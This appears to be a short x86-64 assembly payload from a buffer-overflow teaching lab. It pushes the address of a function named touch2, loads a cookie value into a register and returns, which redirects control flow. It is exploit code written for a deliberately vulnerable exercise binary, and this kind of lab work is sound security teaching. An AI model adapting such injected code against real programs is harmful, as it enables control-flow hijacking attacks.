movq $0x4017ec, %rdi    # address of touch2
push %rdi
mov 0x6044e4, %edi      # copy cookie to %edi(val)
ret